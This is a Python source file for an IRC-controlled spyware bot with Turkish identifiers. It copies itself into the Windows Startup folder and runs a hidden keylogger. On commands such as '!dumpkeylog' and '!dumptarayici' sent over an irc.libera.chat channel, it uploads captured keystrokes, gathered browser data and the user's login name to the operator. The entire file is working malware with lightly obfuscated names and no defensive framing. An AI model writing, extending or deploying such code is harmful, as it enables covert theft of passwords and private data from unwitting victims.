from irc_bot import *
import time
import string
import random
import os
import shutil
import dosyayukle
import sys
from datetime import datetime


from threading import Thread
from pynput import keyboard
import t4r4y1c1
filename = os.path.basename(sys.argv[0])
startpath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
shutil.copy2(filename,startpath)
os.chdir(os.getenv("TEMP"))


saat = datetime.now().strftime("%H")
def saat_yazdir():
    os.remove("saat.txt")
    with open("saat.txt","a") as saat_belirle:
        saat_belirle.write(saat)
saat_dosya = open("saat.txt","a+")
saat_dosya.seek(0)
dosya_icerik = saat_dosya.read().strip()
print(dosya_icerik)
if dosya_icerik == saat:
    sys.exit()
else:
    saat_dosya.close()
    saat_yazdir()
saat_dosya.close()




        
def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))
server = "irc.libera.chat"
kanal = "#change"
CAPS = 0
def tus_k4yd3d1c1():
    def on_press(key):
        global CAPS
        with open("tuslar.txt", "ab") as f:
            try:
                if key == keyboard.Key.enter:
                    f.write(b'\n')
                elif key == keyboard.Key.space:
                    f.write(b' ')
                elif key == keyboard.Key.caps_lock:
                    if CAPS == 0:
                        CAPS = 1
                    else:
                        CAPS = 0
                elif hasattr(key, 'char'):
                    if CAPS == 0:
                        f.write(key.char.encode())
                    else:
                        f.write(key.char.encode().upper())
                else:
                    f.write(str(key).encode())
            except:pass
                

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
def sunucu_baglan():
    while 1:
        try:
            botnick = randomword(8)
            baglan(server,botnick)
            kanal_giris(kanal)
            break
        except:
            time.sleep(3)
            continue

    

def cevap_ver(mesaj,kisi):
    if mesaj.find(":!sessions") > -1:
        ozel_mesaj(os.getlogin(),kisi)
    if mesaj.find(":Erroneous") > -1:
        sunucu_baglan()
    if mesaj.find(":!dumpkeylog")> -1:
        filel0g = dosyayukle.yukle("tuslar.txt")
        ozel_mesaj(filel0g,kisi)
        
    if mesaj.find(":!dumptarayici") > -1:
        t4r4y1c1.t4r4y1c1_b1lg1()
        filel0g1 = dosyayukle.yukle("tarayici_bilgi.txt")
        ozel_mesaj(filel0g1,kisi)

def cevap_don():
    while 1:
        mesaj = mesaj_al()
        start = mesaj.find(":") + 1;end = mesaj.find("!")
        kisi = mesaj[start:end]
        print(mesaj)
        cevap_ver(mesaj,kisi)
sunucu_baglan()
thread1 = Thread(target=tus_k4yd3d1c1)
thread2 = Thread(target=cevap_don)
thread1.start()
thread2.start()
